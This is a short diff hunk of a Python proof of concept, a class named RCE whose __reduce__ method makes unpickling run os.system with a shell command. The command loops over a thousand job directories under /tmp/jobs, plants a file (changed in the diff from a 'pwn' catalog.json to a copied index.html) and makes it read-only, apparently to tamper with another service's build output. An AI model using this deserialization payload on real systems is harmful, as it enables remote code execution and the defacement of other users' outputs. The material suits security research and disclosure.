@@ -7,7 +7,7 @@ class RCE:
     def __reduce__(self):
         rcmd = ""
         for i in range(0, 1000):
-            rcmd += "mkdir -p /tmp/jobs/%s/target/target/; echo pwn > /tmp/jobs/%s/target/target/catalog.json; chmod 444 /tmp/jobs/%s/target/target/catalog.json;" % (i, i, i)
+            rcmd += "mkdir -p /tmp/jobs/%s/target/target/; cp target/index.html /tmp/jobs/%s/target/target/index.html; chmod 444 /tmp/jobs/%s/target/target/index.html;" % (i, i, i)
         cmd = (rcmd)
         return os.system, (cmd,)
 
